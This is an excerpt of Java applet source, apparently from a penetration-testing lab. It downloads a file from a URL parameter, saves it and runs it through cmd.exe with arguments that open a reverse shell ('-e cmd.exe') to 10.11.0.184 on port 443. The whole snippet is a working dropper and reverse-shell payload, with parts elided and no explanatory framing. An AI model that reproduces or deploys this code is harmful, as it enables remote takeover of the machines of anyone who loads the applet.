...
public class Java extends Applet {
    ...
    if (download.length() > 0) { 
        URL url = new URL(download); // URL parameter
        InputStream in = url.openStream(); // Get an input stream for reading
        BufferedInputStream bufIn = new BufferedInputStream(in); // Create a buffered input stream for efficency
        ...
        for (;;) {
            ...
            out.close(); 
            in.close();
            f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.184 443 –e cmd.exe");
        } 
    } catch(IOException e) { 
        e.printStackTrace();
    }
